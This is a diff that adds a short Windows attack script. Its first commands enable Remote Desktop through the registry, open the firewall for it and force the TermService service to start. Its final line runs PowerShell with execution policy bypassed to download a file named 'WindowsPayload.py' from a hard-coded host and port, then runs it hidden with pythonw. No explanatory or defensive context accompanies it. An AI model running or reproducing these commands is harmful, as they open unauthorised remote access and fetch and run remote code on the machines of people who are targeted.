@@ -1,0 +1,17 @@
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+
+sc config TermService start= auto
+sc start TermService
+
+
+netstat -an | find "3389"
+
+
+
+
+
+cmd.exe /k powershell -NoProfile -ExecutionPolicy Bypass -Command "$url = 'http://192.168.8.240:8797/WindowsPayload.py'; $destination = [System.IO.Path]::Combine($env:USERPROFILE, 'Documents', 'WindowsPayload.py'); Invoke-WebRequest -Uri $url -OutFile $destination; Start-Process -FilePath 'pythonw.exe' -ArgumentList $destination -NoNewWindow"
